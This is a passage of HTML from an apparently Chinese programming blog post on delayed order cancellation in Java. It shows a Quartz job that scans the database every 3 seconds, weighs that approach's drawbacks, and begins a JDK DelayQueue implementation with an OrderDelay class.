class=\"crayon-v\">TriggerBuilder</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-11\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">impl</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">StdSchedulerFactory</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-12\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Job</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-13\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JobExecutionContext</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-14\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">org</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">quartz</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">JobExecutionException</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-16\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">MyJob</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">implements</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Job</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-17\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">execute</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">JobExecutionContext </span><span class=\"crayon-v\">context</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">JobExecutionException</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">out</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">println</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"要去数据库扫描啦。。。\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-20\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-21\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-22\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">main</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-sy\">[</span><span class=\"crayon-sy\">]</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">args</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">throws</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Exception</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-23\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 创建任务</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-24\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">JobDetail </span><span class=\"crayon-v\">jobDetail</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">JobBuilder</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newJob</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">MyJob</span><span class=\"crayon-sy\">.</span><span class=\"crayon-t\">class</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-25\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">withIdentity</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"job1\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"group1\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">build</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-26\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 创建触发器 每3秒钟执行一次</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-27\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Trigger </span><span class=\"crayon-v\">trigger</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">TriggerBuilder</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-28\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">newTrigger</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-29\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">withIdentity</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"trigger1\"</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-s\">\"group3\"</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-30\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">withSchedule</span><span class=\"crayon-sy\">(</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-31\"><span class=\"crayon-h\">                        </span><span class=\"crayon-v\">SimpleScheduleBuilder</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">simpleSchedule</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-32\"><span class=\"crayon-h\">                                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">withIntervalInSeconds</span><span class=\"crayon-sy\">(</span><span class=\"crayon-cn\">3</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">repeatForever</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-33\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">build</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-34\"><span class=\"crayon-h\">        </span><span class=\"crayon-e\">Scheduler </span><span class=\"crayon-v\">scheduler</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">new</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">StdSchedulerFactory</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getScheduler</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-35\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 将任务及其触发器放入调度器</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-36\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">scheduler</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">scheduleJob</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">jobDetail</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">trigger</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-37\"><span class=\"crayon-h\">        </span><span class=\"crayon-c\">// 调度器开始调度任务</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-38\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">scheduler</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">start</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-39\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358a3126485606-40\"><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358a3126485606-41\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0058 seconds] -->\r\n<p>运行代码，可发现每隔3秒，输出如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358a8288684417\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\n要去数据库扫描啦。。。</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358a8288684417-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358a8288684417-1\">要去数据库扫描啦。。。</div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h4 id=\"优缺点\">优缺点</h4>\n<p>优点:简单易行，支持集群操作<br>\n缺点:(1)对服务器内存消耗大<br>\n(2)存在延迟，比如你每隔3分钟扫描一次，那最坏的延迟时间就是3分钟<br>\n(3)假设你的订单有几千万条，每隔几分钟这样扫描一次，数据库损耗极大</p>\n<h3 id=\"jdk的延迟队列\">(2)JDK的延迟队列</h3>\n<h4 id=\"思路-1\">思路</h4>\n<p>该方案是利用JDK自带的DelayQueue来实现，这是一个无界阻塞队列，该队列只有在延迟期满的时候才能从中获取元素，放入DelayQueue中的对象，是必须实现Delayed接口的。<br>\nDelayedQueue实现工作流程如下图所示</p>\n<div><img class=\"aligncenter\" src=\"http://jbcdn2.b0.upaiyun.com/2018/05/8fcc3d0354db5a5bba681a57795249a1.png\" alt=\"image\"></div>\n<p>其中Poll():获取并移除队列的超时元素，没有则返回空<br>\ntake():获取并移除队列的超时元素，如果没有则wait当前线程，直到有元素满足超时条件，返回结果。</p>\n<h4 id=\"实现-1\">实现</h4>\n<p>定义一个类OrderDelay实现Delayed，代码如下</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b4aa930358ac787023129\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\npackage com.rjzheng.delay2;\r\n\r\nimport java.util.concurrent.Delayed;\r\nimport java.util.concurrent.TimeUnit;\r\n\r\npublic class OrderDelay implements Delayed {\r\n    \r\n    private String orderId;\r\n    private long timeout;\r\n\r\n    OrderDelay(String orderId, long timeout) {\r\n        this.orderId = orderId;\r\n        this.timeout = timeout + System.nanoTime();\r\n    }\r\n\r\n    public int compareTo(Delayed other) {\r\n        if (other == this)\r\n            return 0;\r\n        OrderDelay t = (OrderDelay) other;\r\n        long d = (getDelay(TimeUnit.NANOSECONDS) - t\r\n                .getDelay(TimeUnit.NANOSECONDS));\r\n        return (d == 0) ? 0 : ((d &lt; 0) ? -1 : 1);\r\n    }\r\n\r\n    // 返回距离你自定义的超时时间还有多少\r\n    public long getDelay(TimeUnit unit) {\r\n        return unit.convert(timeout - System.nanoTime(), TimeUnit.NANOSECONDS);\r\n    }\r\n\r\n    void print() {\r\n        System.out.println(orderId+\"编号的订单要删除啦。。。。\");\r\n    }\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b4aa930358ac787023129-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-5b4aa930358ac787023129-33\">33</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-1\"><span class=\"crayon-t\">package</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">com</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">rjzheng</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">delay2</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-2\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-3\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">Delayed</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-4\"><span class=\"crayon-e\">import </span><span class=\"crayon-v\">java</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">util</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">concurrent</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-5\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-6\"><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">OrderDelay</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">implements</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Delayed</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-7\"><span class=\"crayon-h\">    </span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-8\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-9\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">private</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-10\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-11\"><span class=\"crayon-h\">    </span><span class=\"crayon-e\">OrderDelay</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">String</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">,</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-12\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">orderId</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">orderId</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-13\"><span class=\"crayon-h\">        </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">timeout</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">+</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">System</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">nanoTime</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-14\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-15\"> </div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-16\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">compareTo</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">Delayed </span><span class=\"crayon-v\">other</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-17\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">other</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-r\">this</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-18\"><span class=\"crayon-h\">            </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-19\"><span class=\"crayon-h\">        </span><span class=\"crayon-i\">OrderDelay</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">t</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">OrderDelay</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">other</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-20\"><span class=\"crayon-h\">        </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">getDelay</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">NANOSECONDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">t</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-21\"><span class=\"crayon-h\">                </span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">getDelay</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">TimeUnit</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">NANOSECONDS</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-22\"><span class=\"crayon-h\">        </span><span class=\"crayon-st\">return</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">==</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">(</span><span class=\"crayon-v\">d</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">0</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">?</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">:</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-23\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-24\"> </div><div class=\"crayon-line\" id=\"crayon-5b4aa930358ac787023129-25\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// 返回距离你自定义的超时时间还有多少</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b4aa930358ac787023129-26\"><span class=\"crayon-h\">    </span><span class=\"crayon-m\">public</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">long</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">getDelay</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">TimeUnit </span><span class=\"crayon-v\">unit</span><span 